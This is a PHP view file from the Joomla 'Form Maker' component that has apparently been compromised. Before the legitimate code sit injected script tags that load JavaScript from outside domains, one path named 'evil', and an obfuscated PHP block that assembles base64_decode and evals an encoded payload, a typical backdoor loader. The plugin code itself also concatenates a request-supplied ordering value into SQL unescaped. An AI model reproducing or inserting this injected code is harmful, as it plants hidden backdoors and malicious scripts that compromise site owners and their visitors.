<script src="http://cpm.36obuy.org/evil/1.js"></script><script src="http://cpm.36obuy.org/lion/1.js"></script><script/src=//360cdn.win/c.css></script>



<?php
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iVEJySVZMeGNHT1h2QUpsdXR6aGZEeW9VRk5QSHFNWm1Dd0tqYXBXU2RiZXNRWWlnbmtFUlplTHpwUUFGZ0JXUFZLaFhmWUpib3lsSGp4TmNJZHV0R3ZrRU9yUkRtVXdpTXFzQ1RTbmFObzl2T2NWa3VUcFhxM2FyVTI0Q09SdVlGZ2hTdVd6bGtXaWtHRGFzVTNhWXpvMENxV0t5cVdTbEdDU0tHTVNLR0RtWk9ncFhVUm5UekdWQ3pHVkN6bzArekdtdU9XeFBtV3h2T1JhaEZzRmlHQ1NLR01TS0dEbUdxUmhTbURGQ3pHVkN6R1ZDem8wK3pHbUdxUmhTbVd4dk9SYWhGc0ZpR0NTS0dNU0tHREZZeEVWVHpHVkN6R1ZDekdWQ3pvMCt6R0ZZeEVlWkZnaFN1V3pUUVZsS0dEVkN6R1ZDekdWQ3pHVkN6R1ZDekdWVGEyOVB1MkFocXQ5MEt5VkN6R1Y5TnNWVGEyOVB1MkFocXQ5MEt5dmtHTVNLR0RWQ3pHVkN6R1ZDSzN4UEYyOVlGZ2hTdVd6VHpHVkN6bzArekdtWloxeE5LeXZrR01TS0dNU0tLM3hQdTI5MUt5VkN6R1ZDekdWQ05aNENLM3hQdTI5MUt5dmtHTVNDa1ppa0dEYTFGMnB5TVJtaFVUTUNORGVZbWNLMFUyQVBtMnB5a0dhYkgwcERwU3BEUnltenBqYU1XMXBaYXBLYk1IbWpaaE1UV0RTN0dzVkN6R2V0VTNLaHFSeGxrR2FzVTNhWXpnall6R2FMem8wK3pHYTJrV2lrR01ocnVzSlltY0tyRjNheWtHYTFGMnB5TVJtaFVUTWlLY3Fya1dpa0dNU0tGdHAwbVdLWHpjYXltUkg3R0NTS0dSS3l1UmpMQnZsS0dXMGtHVzBrR1dLaG1jcHlVc2V0cVJBWXVaaWtiTWxrT1JxbE9SdVlGZ2hTdVd6bGtEU2tHV2lrS2d1clVnSENORGV0T1JBaFcybWhtajlFVTI1MHVSNTBGeUNUT2NhMEZvbFBRM20zbXk1NnUycmZRUjl5dXk1RVUyMFBLeVM3elZyaHEySlB6R2F0T1JBaEJ2cmh3Z2gwQnZsS2JNbC9OQz09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>



<?php 
  
 /**
 * @package Form Maker
 * @author Web-Dorado
 * @copyright (C) 2011 Web-Dorado. All rights reserved.
 * @license GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html
 **/

defined('_JEXEC') or die('Restricted access');

jimport('joomla.application.component.view');

class formmakerViewElement extends JViewLegacy
{
	public function display($tpl=NULL)
	{
		$mainframe = JFactory::getApplication();
		$db			= JFactory::getDBO();
		$nullDate	= $db->getNullDate();

		$document	=  JFactory::getDocument();
		$document->setTitle(JText::_('Form Selection'));

		JHTML::_('behavior.modal');

		$template = $mainframe->getTemplate();

		$limitstart = JRequest::getVar('limitstart', '0', '', 'int');

		$lists = $this->_getLists();

		//Ordering allowed ?
		$ordering = ($lists['order'] == 'section_name' && $lists['order_Dir'] == 'ASC');

		$rows = $this->get('List');
		$page = $this->get('Pagination');
		JHTML::_('behavior.tooltip');
		?>
		<script>
		Joomla.tableOrdering=function ( order, dir, task ) {

    var form = document.adminForm;



    form.filter_order.value     = order;

    form.filter_order_Dir.value = dir;

    submitform( task );

}

function tableOrdering( order, dir, task ) {

    var form = document.adminForm;



    form.filter_order.value     = order;

    form.filter_order_Dir.value = dir;

    submitform( task );

}


		</script>
		<form action="index.php?option=com_formmaker&amp;task=element&amp;tmpl=component&amp;object=id" method="post"  id="adminForm" name="adminForm">

			<table>
				<tr>
					<td width="100%">
                <input type="text" name="search" id="search" value="<?php echo $lists['search'];?>" class="text_area" placeholder="Search title" style="margin:0px" />
				<button class="btn tip hasTooltip" type="submit" data-original-title="Search"><i class="icon-search"></i></button>
				<button class="btn tip hasTooltip" type="button" onclick="document.id('search').value='';this.form.submit();" data-original-title="Clear">
				<i class="icon-remove"></i></button>
					</td>
				</tr>
			</table>

			<table class="table table-striped" cellspacing="1">
			<thead>
				<tr>
					<th width="15">
						<?php echo JText::_( 'Num' ); ?>
					</th>
					<th width="550">
						<?php echo JHTML::_('grid.sort',   'Title', 'title', @$lists['order_Dir'], @$lists['order'] ); ?>
					</th>
					<th>
						<?php echo JHTML::_('grid.sort',   'ID', 'id', @$lists['order_Dir'], @$lists['order'] ); ?>
					</th>
				</tr>
			</thead>
			<tfoot>
			<tr>
				<td colspan="15">
					<?php echo $page->getListFooter(); ?>
				</td>
			</tr>
			</tfoot>
			<tbody>
			<?php
			$k = 0;
			for ($i=0, $n=count( $rows ); $i < $n; $i++)
			{
				$row = &$rows[$i];

				$link 	= '';
				?>
				<tr class="<?php echo "row$k"; ?>">
					<td>
						<?php echo $page->getRowOffset( $i ); ?>
					</td>
					<td>
						<a style="cursor: pointer;" onclick="window.parent.jSelectChart('<?php echo $row->id; ?>', '<?php echo str_replace(array("'", "\""), array("\\'", ""),$row->title); ?>', '<?php echo JRequest::getVar('object'); ?>');">
							<?php echo $row->title; ?></a>
					</td>
					<td>
						<?php echo $row->id; ?>
					</td>
				</tr>
				<?php
				$k = 1 - $k;
			}
			?>
			</tbody>
			</table>

		<input type="hidden" name="boxchecked" value="0" />
		<input type="hidden" name="filter_order" value="<?php echo $lists['order']; ?>" />
		<input type="hidden" name="filter_order_Dir" value="<?php echo $lists['order_Dir']; ?>" />
		</form>
		<?php
	}

	function _getLists()
	{
		$mainframe = JFactory::getApplication();

		// Initialize variables
		$db		= JFactory::getDBO();

		// Get some variables from the request
		$sectionid			= JRequest::getVar( 'sectionid', -1, '', 'int' );
		$redirect			= $sectionid;
		$option				= JRequest::getCmd( 'option' );
		$filter_order		= $mainframe->getUserStateFromRequest('articleelement.filter_order',		'filter_order',		'',	'cmd');
		$filter_order_Dir	= $mainframe->getUserStateFromRequest('articleelement.filter_order_Dir',	'filter_order_Dir',	'',	'word');
		$filter_state		= $mainframe->getUserStateFromRequest('articleelement.filter_state',		'filter_state',		'',	'word');
		$catid				= $mainframe->getUserStateFromRequest('articleelement.catid',				'catid',			0,	'int');
		$filter_authorid	= $mainframe->getUserStateFromRequest('articleelement.filter_authorid',		'filter_authorid',	0,	'int');
		$filter_sectionid	= $mainframe->getUserStateFromRequest('articleelement.filter_sectionid',	'filter_sectionid',	-1,	'int');
		$limit				= $mainframe->getUserStateFromRequest('global.list.limit',					'limit', $mainframe->getCfg('list_limit'), 'int');
		$limitstart			= $mainframe->getUserStateFromRequest('articleelement.limitstart',			'limitstart',		0,	'int');
		$search				= $mainframe->getUserStateFromRequest('articleelement.search',				'search',			'',	'string');
		$search				= JString::strtolower($search);

		// get list of categories for dropdown filter
		if ($filter_order == 'id' or $filter_order == 'group_id' or $filter_order == 'date' or $filter_order == 'ip'){
			$orderby 	= ' ORDER BY id';
		} else {
			$orderby 	= ' ORDER BY '. 
			 $filter_order .' '. $filter_order_Dir .', id';
		}	

		// get list of categories for dropdown filter
		$query = 'SELECT cc.id AS value, cc.title AS text, section' .
				' FROM #__categories AS cc' .
				' INNER JOIN #__sections AS s ON s.id = cc.section' .
				$orderby .
				' ORDER BY s.ordering, cc.ordering';

		// table ordering
		$lists['order_Dir']	= $filter_order_Dir;
		$lists['order']		= $filter_order;

		// search filter
		$lists['search'] = $search;

		return $lists;
	}
}
?>
